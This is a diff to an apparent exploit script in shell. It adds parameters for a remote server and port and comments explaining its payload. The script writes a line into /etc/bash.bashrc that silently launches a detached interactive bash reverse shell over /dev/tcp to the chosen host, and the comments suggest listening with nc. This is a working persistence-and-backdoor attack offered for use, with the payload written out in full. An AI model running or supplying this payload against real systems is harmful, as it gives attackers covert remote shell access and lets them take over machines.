@@ -4,6 +4,12 @@
 # localhost:8080 every minute. A backup of the old file is stored in $HOME
 # before modifying the file.
 #
+# The script takes either 0 or 2 parameters. If parameters are given, they are
+# as follows:
+#
+#	$1: The server to connect to for the reverse shell
+#	$2: The port to connect to
+#
 # Once the exploit completes, open a TCP server on localhost:8080. For example:
 #
 #	nc -lp 8080 localhost
@@ -25,8 +31,18 @@ fi
 # file to edit
 target=/etc/bash.bashrc
 
-# note the trailing '#' to ignore any garbage from the old line
-payload="(nohup bash -c 'bash -i>&/dev/tcp/$server/$port 0>&1' >/dev/null 2>&1&) #"
+# in the payload, note the trailing '#' to ignore any garbage from the old line.
+# the payload looks complex, but in essence it just runs the following command
+# silently in the background, detached from the terminal:
+#
+#	bash -i >&/dev/tcp/$server/$port 0>&1
+#
+# this opens a reverse shell over TCP at the given server and port. nohup and
+# the trailing ampersand are to prevent the shell from closing when the bash
+# process ends, and the command is wrapped in `bash -c` because /dev/tcp is
+# a bashism.
+
+payload="(nohup bash -c 'bash -i>&/dev/tcp/$server/$port 0>&1'>/dev/null 2>&1&) #"
 payload_len=$(printf "$payload" | wc -c)
 
 if [ ! -r $target ]; then
